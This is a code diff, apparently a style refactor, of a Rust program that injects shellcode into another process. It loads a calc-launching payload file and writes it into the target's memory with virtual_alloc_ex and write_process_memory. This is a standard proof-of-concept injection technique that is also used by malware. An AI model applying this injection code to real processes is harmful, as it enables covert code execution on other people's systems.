@@ -5,8 +5,8 @@ use std::ffi::c_void;
 use std::ptr::{null, null_mut};
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
 
-static SHELLCODE: [u8; 98] = *include_bytes!("../../w64-exec-calc-shellcode-func.bin");
-static SIZE: usize = SHELLCODE.len();
+const SHELLCODE: &[u8] = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
+const SIZE: usize = SHELLCODE.len();
 
 const PROCESS_ALL_ACCESS: u32 = 0x1fffff;
 const MEM_COMMIT: u32 = 0x1000;
@@ -77,7 +77,7 @@ fn main() {
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
         );
-        if dest == null_mut() {
+        if dest.is_null() {
             eprintln!("virtual_alloc_ex failed!");
             return;
         }
@@ -85,7 +85,7 @@ fn main() {
         let res = write_process_memory(
             handle,
             dest,
-            SHELLCODE.as_ptr() as *const c_void,
+            SHELLCODE.as_ptr().cast(),
             SIZE,
             null_mut(),
         );
